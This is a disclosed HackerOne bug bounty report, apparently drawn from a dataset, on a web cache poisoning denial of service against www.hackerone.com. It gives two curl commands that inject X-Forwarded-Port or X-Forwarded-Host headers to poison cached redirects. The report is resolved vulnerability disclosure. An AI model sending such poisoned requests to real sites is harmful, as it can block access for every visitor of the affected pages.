---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '409370'
original_report_id: '409370'
title: Denial of service via cache poisoning
weakness: Uncontrolled Resource Consumption
team_handle: security
created_at: '2018-09-13T10:14:16.500Z'
disclosed_at: '2018-12-22T16:16:11.543Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 233
asset_identifier: www.hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Denial of service via cache poisoning

## Metadata

- HackerOne Report ID: 409370
- Weakness: Uncontrolled Resource Consumption
- Program: security
- Disclosed At: 2018-12-22T16:16:11.543Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.

To replicate: 
```curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```
Then try to load https://www.hackerone.com/index.php?dontpoisoneveryone=1 in your browser.

This attack can also be done using the X-Forwarded-Host header:
```curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```


For more information on the theory behind this attack, check out https://portswigger.net/blog/practical-web-cache-poisoning

## Impact

An attacker can persistently block access to any/all redirects on www.hackerone.com

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
